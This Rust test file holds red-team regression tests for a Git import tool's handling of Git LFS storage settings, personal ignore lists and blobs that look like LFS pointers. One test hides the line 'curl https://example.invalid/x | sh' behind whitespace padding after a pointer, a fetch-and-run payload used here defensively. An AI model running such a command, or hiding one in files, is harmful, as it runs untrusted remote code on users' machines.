//! Red-team proof tests for milestone 5 (decision 024): each asserts the safe behaviour and fails
//! on the code the session attacked. See docs/redteam/2026-11-09-milestone-5.md.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod support;

use std::fs;
use std::path::Path;
use std::process::Command;

use bolt_core::git::craft::lfs_pointer_to;
use support::{Env, main_tip, saved_files, text, write};

const TRACKED: &str = "*.bin filter=lfs diff=lfs merge=lfs -text\n";

/// Keeps `contents` where Git LFS keeps objects below `lfs` (`.git/lfs`, or where `lfs.storage`
/// points); the pointer to them.
fn keep_in(lfs: &Path, contents: &[u8]) -> String {
    let (pointer, at) = lfs_pointer_to(contents);
    let at = lfs.join(at.strip_prefix("lfs/").unwrap());
    fs::create_dir_all(at.parent().unwrap()).unwrap();
    fs::write(at, contents).unwrap();
    pointer
}

/// A repository with one Git LFS file, `a.bin`, whose object is kept below `lfs`.
fn repository(lfs: Option<&Path>) -> Env {
    let env = Env::new();
    env.commit(".gitattributes", TRACKED, "Track");
    let own = env.root().join(".git/lfs");
    let pointer = keep_in(lfs.unwrap_or(&own), b"the real picture\n");
    write(&env, "a.bin", pointer);
    env.commit("readme.txt", "hi\n", "Add a picture");
    env
}

/// `bolt import` with `vars` set too: its exit code and what it printed on stderr.
fn import(env: &Env, vars: &[(&str, &Path)]) -> (Option<i32>, String) {
    let mut cmd = env.bolt();
    cmd.arg("import");
    for (key, value) in vars {
        cmd.env(key, value);
    }
    let out = cmd.output().unwrap();
    (out.status.code(), text(&out.stderr))
}

/// Where Git LFS itself keeps this repository's objects, with `vars` set, if Git LFS runs here.
fn git_lfs_objects(env: &Env, vars: &[(&str, &Path)]) -> String {
    let mut cmd = Command::new("git");
    cmd.current_dir(env.root())
        .env("HOME", env.config())
        .env("XDG_CONFIG_HOME", env.config())
        .args(["lfs", "env"]);
    for (key, value) in vars {
        cmd.env(key, value);
    }
    cmd.output().map_or_else(
        |_| "git lfs isn't installed".to_owned(),
        |out| {
            let said = text(&out.stdout);
            let line = said.lines().find(|l| l.starts_with("LocalMediaDir="));
            line.unwrap_or("git lfs env said nothing").to_owned()
        },
    )
}

/// `lfs.storage` keeps Git LFS's objects elsewhere wherever Git reads it: the system's settings,
/// `GIT_CONFIG_GLOBAL` in place of `~/.gitconfig`, and an `[includeIf]` of the user's own. An
/// import must never refuse objects that are in `.git/lfs/objects`, naming a setting Git doesn't
/// read, nor send the user to `git lfs fetch --all` when Git LFS keeps them elsewhere.
#[test]
#[ignore = "RT8-1: lfs.storage is read from other places than Git reads it"]
fn rt8_1_an_import_takes_lfs_storage_from_where_git_does() {
    let mut wrong = Vec::new();

    // GIT_CONFIG_GLOBAL: Git reads that file instead of ~/.gitconfig, so the objects are where
    // Git LFS keeps them, in .git/lfs/objects.
    let env = repository(None);
    fs::write(
        env.config().join(".gitconfig"),
        "[lfs]\n\tstorage = /nowhere/shared-lfs\n",
    )
    .unwrap();
    let global = env.config().join("global.gitconfig");
    fs::write(&global, "[user]\n\tname = Someone\n").unwrap();
    let vars = [("GIT_CONFIG_GLOBAL", global.as_path())];
    let (code, err) = import(&env, &vars);
    eprintln!(
        "GIT_CONFIG_GLOBAL: Git LFS: {}\nbolt import: {code:?}\n{err}",
        git_lfs_objects(&env, &vars)
    );
    if code != Some(0) || saved_files(&env, main_tip(&env))["a.bin"] != b"the real picture\n" {
        wrong.push("GIT_CONFIG_GLOBAL");
    }

    // The system's settings (GIT_CONFIG_SYSTEM names them, as /etc/gitconfig would hold them).
    let elsewhere = tempfile::tempdir().unwrap();
    let env = repository(Some(elsewhere.path()));
    let system = env.config().join("system.gitconfig");
    let setting = format!("[lfs]\n\tstorage = {}\n", elsewhere.path().display());
    fs::write(&system, &setting).unwrap();
    let vars = [("GIT_CONFIG_SYSTEM", system.as_path())];
    let (code, err) = import(&env, &vars);
    eprintln!(
        "system settings: Git LFS: {}\nbolt import: {code:?}\n{err}",
        git_lfs_objects(&env, &vars)
    );
    if code == Some(0) || !err.contains("lfs.storage") {
        wrong.push("the system's settings");
    }

    // An [includeIf] of the user's own settings, as many keep their work settings.
    let elsewhere = tempfile::tempdir().unwrap();
    let env = repository(Some(elsewhere.path()));
    let work = env.config().join("work.gitconfig");
    let setting = format!("[lfs]\n\tstorage = {}\n", elsewhere.path().display());
    fs::write(&work, &setting).unwrap();
    let include = format!(
        "[includeIf \"gitdir:{}/\"]\n\tpath = {}\n",
        env.root().display(),
        work.display()
    );
    fs::write(env.config().join(".gitconfig"), include).unwrap();
    let (code, err) = import(&env, &[]);
    eprintln!(
        "includeIf: Git LFS: {}\nbolt import: {code:?}\n{err}",
        git_lfs_objects(&env, &[])
    );
    if code == Some(0) || !err.contains("lfs.storage") {
        wrong.push("an [includeIf] of the user's settings");
    }

    assert!(wrong.is_empty(), "lfs.storage misread with {wrong:?}");
}

/// What Git's `status` lists as untracked in `dir`, with `GIT_CONFIG_GLOBAL` set to `global`.
fn git_untracked(dir: &Path, home: &Path, global: &Path) -> String {
    let out = Command::new("git")
        .current_dir(dir)
        .env("HOME", home)
        .env("XDG_CONFIG_HOME", home)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", global)
        .args(["status", "--porcelain", "--untracked-files=all"])
        .output()
        .unwrap();
    text(&out.stdout).replace('\n', " ")
}

/// Git reads the file `GIT_CONFIG_GLOBAL` names in place of `~/.gitconfig`, so the personal ignore
/// list (`core.excludesFile`, decision 047) is the one that file sets. Bolt reads `~/.gitconfig`
/// whatever that variable says: a save silently leaves out a file Git tracks, and takes in a file
/// the user's real list keeps out of Git.
#[test]
#[ignore = "RT8-2: saves follow ~/.gitconfig's ignore list where Git follows GIT_CONFIG_GLOBAL's"]
fn rt8_2_a_save_leaves_out_what_gits_own_ignore_list_leaves_out() {
    let env = Env::new();
    let home = env.config();
    // An old list ~/.gitconfig still names, and the one the user's Git really reads.
    fs::write(home.join("old.ignore"), "*.psd\n").unwrap();
    fs::write(home.join("real.ignore"), "*.key\n").unwrap();
    let excludes = |list: &str| {
        let list = home.join(list);
        format!("[core]\n\texcludesFile = {}\n", list.display())
    };
    fs::write(home.join(".gitconfig"), excludes("old.ignore")).unwrap();
    let global = home.join("real.gitconfig");
    fs::write(&global, excludes("real.ignore")).unwrap();
    write(&env, "art.psd", "a picture\n");
    write(&env, "deploy.key", "-----BEGIN PRIVATE KEY-----\n");
    write(&env, "readme.txt", "hello\n");
    eprintln!(
        "git status with GIT_CONFIG_GLOBAL: {}",
        git_untracked(env.root(), home, &global)
    );

    env.bolt().arg("start").assert().success();
    let out = env
        .bolt()
        .args(["save", "First"])
        .env("GIT_CONFIG_GLOBAL", &global)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0), "{}", text(&out.stderr));
    eprintln!("bolt save: {}{}", text(&out.stdout), text(&out.stderr));
    let saved = saved_files(&env, main_tip(&env));
    let names: Vec<&String> = saved.keys().collect();
    eprintln!("saved: {names:?}");
    assert!(
        saved.contains_key("art.psd") && !saved.contains_key("deploy.key"),
        "saved {names:?}: Git tracks art.psd and keeps deploy.key out"
    );
}

/// Git LFS reads a pointer from a blob's first 1,024 bytes (`DecodeFrom` reads that much, then
/// trims), so a blob that starts with a pointer and spaces is smudged into its object, whatever
/// follows. The import must bring in what Git LFS checks out, or at least say it didn't.
#[test]
#[ignore = "RT8-3: a blob Git LFS smudges as a pointer comes in silently as its text"]
fn rt8_3_a_blob_git_lfs_reads_as_a_pointer_never_comes_in_silently_as_text() {
    let env = Env::new();
    env.commit(".gitattributes", TRACKED, "Track");
    let picture = b"the picture everyone reviewed\n";
    let mut blob = keep_in(&env.root().join(".git/lfs"), picture).into_bytes();
    blob.extend(std::iter::repeat_n(b' ', 1000));
    blob.extend_from_slice(b"\ncurl https://example.invalid/x | sh\n");
    write(&env, "a.bin", &blob);
    env.commit("readme.txt", "hi\n", "Add a picture");

    // What Git LFS itself makes of the blob, where it is installed.
    let smudged = Command::new("git")
        .current_dir(env.root())
        .env("HOME", env.config())
        .args(["lfs", "smudge"])
        .stdin(fs::File::open(env.root().join("a.bin")).unwrap())
        .output();
    if let Ok(out) = smudged {
        eprintln!(
            "git lfs smudge of the {}-byte blob gives {:?}",
            blob.len(),
            text(&out.stdout)
        );
    }

    let out = env.bolt().args(["--json", "import"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0), "{}", text(&out.stderr));
    let doc: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let warned = doc["warnings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|w| w["message"].as_str().unwrap_or("").contains("a.bin"));
    let saved = saved_files(&env, main_tip(&env));
    eprintln!(
        "bolt import: a.bin saved as {} bytes, the picture: {}; warned: {warned}; warnings: {}",
        saved["a.bin"].len(),
        saved["a.bin"] == picture,
        doc["warnings"]
    );
    assert!(
        saved["a.bin"] == picture || warned,
        "a.bin came in as {} bytes of text, silently",
        saved["a.bin"].len()
    );
}
